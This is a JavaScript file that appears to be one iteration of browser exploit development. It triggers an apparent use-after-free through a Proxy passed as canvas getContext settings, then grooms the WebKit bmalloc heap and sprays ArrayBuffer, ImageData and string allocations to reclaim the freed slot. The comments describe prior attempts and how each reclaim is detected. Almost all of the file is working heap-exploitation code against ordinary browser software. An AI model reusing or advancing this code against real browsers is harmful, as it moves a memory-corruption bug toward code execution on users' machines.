// c020: if AB(768) cannot take the slot, which allocation can?
//
// c018 (corrected sequence) and c019 (same + 700 same-class frees to drain bmalloc's deferred-free log) both
// read lw=1 - the object was never released into a reusable slot. So the question is no longer "how do we
// time the spray" but "does this allocation path share the heap at all".
//
// Three sprays, each after its own fresh trigger + alias:
//   AB712   ArrayBuffer(712)      - the object's own size, so the class cannot be an off-by-rounding miss
//   IMG178  ImageData(178,1)      - 178*4 = 712 bytes, JS-readable AND JS-writable
//   STR712  712-char strings      - StringImpl, the allocation the CSSFontFace exploit used
//
// The oracle differs per spray on purpose. For AB/STR the object cannot be read safely (every field is a
// pointer), so we call beginPath() - which stores a fresh Path* INTO the object - and then look for bytes we
// did not write. For IMG178 we can scan the buffer directly for a pointer-shaped qword.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c020-' + LOG[i]); } catch (e) {} } }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function proxySettings(c, cap) {
    var fired = false;
    function fire() { if (!fired) { fired = true; cap.inner = c.getContext('2d'); } }
    return new Proxy({}, { get: function () { fire(); return false; }, has: function () { fire(); return true; } });
  }
  function mkCanvas(i) {
    var c = document.createElement('canvas');
    c.width = 8; c.height = 8; c.id = 's' + i;
    return [c, c.getContext('2d')];
  }

  // returns {inner, freed} after freeing the aliased owner
  async function groom(tag) {
    var cap = { inner: null, outer: null };
    var c1 = document.createElement('canvas');
    c1.width = 8; c1.height = 8; c1.id = 'orig';
    try { cap.outer = c1.getContext('2d', proxySettings(c1, cap)); } catch (e) { note(tag + ':trigger-err'); return null; }
    var sp = [];
    for (var i = 0; i < 500; i++) sp.push(mkCanvas(i));
    var idx = -1;
    try {
      var ident = cap.inner.canvas.id;
      if (ident && ident.charAt(0) === 's') idx = parseInt(ident.slice(1), 10);
    } catch (e) { note(tag + ':alias-err'); return null; }
    if (idx < 0) { note(tag + ':no-alias'); return null; }
    var keep = sp[idx]; sp[idx] = null; keep[0] = null; keep[1] = null;
    var tmp = [];
    for (var k = 0; k < 700; k++) tmp.push(mkCanvas(3000 + k));
    tmp = null;
    try { var j = []; for (var m = 0; m < 6; m++) j.push(new Float64Array(4 * 1024 * 1024)); j = null; } catch (e) {}
    await sleep(1200);
    note(tag + ':groomed@' + idx);
    return cap;
  }

  function scanForPointer(bytes, fill) {
    for (var i = 0; i + 8 <= bytes.length; i += 4) {
      if (bytes[i] === fill && bytes[i + 1] === fill && bytes[i + 2] === fill) continue;
      var b0 = bytes[i], b1 = bytes[i + 1], b2 = bytes[i + 2], b3 = bytes[i + 3], b4 = bytes[i + 4], b5 = bytes[i + 5];
      // canonical x86-64 heap pointer: low byte random-ish, top two bytes zero
      if (b4 === 0 && b5 === 0 && (b0 !== fill || b1 !== fill || b2 !== fill || b3 !== fill)) return i;
    }
    return -1;
  }

  (async function () {
    note('boot');

    // --- AB712 ---
    var cap = await groom('AB712');
    if (cap) {
      var abs = [];
      for (var i = 0; i < 600; i++) { var ab = new ArrayBuffer(712); var f = new Uint8Array(ab); for (var s = 0; s < 712; s++) f[s] = 0x5a; abs.push(ab); }
      await sleep(300);
      var hit = -1;
      try { cap.inner.beginPath(); } catch (e) { note('AB712:beginPath-err:' + e.name); }
      for (var a = 0; a < abs.length && hit < 0; a++) {
        var v = new Uint8Array(abs[a]);
        if (scanForPointer(v, 0x5a) >= 0) hit = a;
      }
      note('AB712:hit=' + hit);
      abs = null;
    }

    // --- IMG178 ---
    cap = await groom('IMG178');
    if (cap) {
      var imgs = [], cx = document.createElement('canvas').getContext('2d');
      for (i = 0; i < 600; i++) {
        var im = cx.createImageData(178, 1);
        var d = im.data;
        for (s = 0; s < d.length; s++) d[s] = 0x5a;
        imgs.push(im);
      }
      await sleep(300);
      var hit2 = -1, off2 = -1;
      try { cap.inner.beginPath(); } catch (e) { note('IMG178:beginPath-err:' + e.name); }
      for (a = 0; a < imgs.length && hit2 < 0; a++) {
        var o = scanForPointer(imgs[a].data, 0x5a);
        if (o >= 0) { hit2 = a; off2 = o; }
      }
      note('IMG178:hit=' + hit2 + '@' + off2);
      imgs = null;
    }

    // --- STR712 ---
    cap = await groom('STR712');
    if (cap) {
      var strs = [];
      var base = new Array(713).join('Z');
      for (i = 0; i < 600; i++) strs.push(base + String.fromCharCode(0x41 + (i % 26)));
      await sleep(300);
      var hit3 = -1;
      try { cap.inner.beginPath(); } catch (e) { note('STR712:beginPath-err:' + e.name); }
      for (a = 0; a < strs.length && hit3 < 0; a++) {
        var st = strs[a];
        for (var p = 0; p < st.length; p++) {
          var ch = st.charCodeAt(p);
          if (ch !== 0x5a && !(ch >= 0x41 && ch <= 0x5a)) { hit3 = a; break; }
        }
      }
      note('STR712:hit=' + hit3);
      strs = null;
    }

    note('done');
    flush();
  })();
})();
